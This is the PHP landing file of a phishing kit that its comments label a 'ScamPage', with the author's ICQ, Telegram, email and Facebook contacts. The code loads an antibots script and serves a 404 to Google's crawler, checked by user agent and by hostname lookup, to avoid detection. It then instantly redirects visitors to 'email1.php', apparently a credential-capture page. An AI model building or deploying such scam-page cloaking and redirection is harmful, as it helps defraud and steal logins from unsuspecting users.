<?php
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE HTML>
<?php

/*
<!--
 _____                   ____                                               
 |  __ \                 |  _ \                                              
 | |__) |_ _  __ _  ___  | |_) |_   _                                        
 |  ___/ _` |/ _` |/ _ \ |  _ <| | | |                                       
 | |  | (_| | (_| |  __/ | |_) | |_| |                                       
 |_|   \__,_|\__, |\___| |____/ \__, |                                       
              __/ |              __/ |                                       
            _|___/           ___|___/    _    _            ______ ____       
           |___ \           / _ \       | |  | |          |____  |___ \      
             __) |_ __ _ __| | | |_ __  | |__| |_   _ _ __    / /  __) |_ __ 
            |__ <| '__| '__| | | | '__| |  __  | | | | '_ \  / /  |__ <| '__|
            ___) | |  | |  | |_| | |    | |  | | |_| | | | |/ /   ___) | |   
           |____/|_|  |_|   \___/|_|    |_|  |_|\__,_|_| |_/_/   |____/|_|   
                                                                             
					 #							       #
                    # ✔ 𝐈𝐂𝐐: 746979851 𝒐𝒓 @alsakib945   #
                   #     ✔  𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @alsakib945        #
				   #    ✔ hridoykhan3rr0r@hotmail.com   #
				   #     ✔   fb.com/error.hunter        #
				    #          -𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐌𝐞 𝐇𝐞𝐫𝐞-          #
                  |#|====================================|#|  
			    𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 𝟚𝟘𝟚𝟘-𝟚𝟘𝟚𝟛---𝐀𝐥𝐥 𝐫𝐢𝐠𝐡𝐭𝐬 𝐑𝐞𝐬𝐞𝐫𝐯𝐞𝐝!
			ɪғ ʏᴏᴜ sᴇᴇ ᴀɴʏ ᴘʀᴏʙʟᴇᴍ ɪɴ ᴘᴀɢᴇ, ᴄᴏɴᴛᴀᴄᴛ ᴡɪᴛʜ ᴍᴇ!
//-----------------------------||--||-----------------------------\\
-->
*/
?>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<title>Loading...</title>
	<meta http-equiv="Refresh" content="0; url='email1.php'" />
</head>
<body>
<!-- ScamPage Design & Developed By 3rr0r Hun73r -->
			<!-- ICQ ID: 746979851 -->
</body>
</html>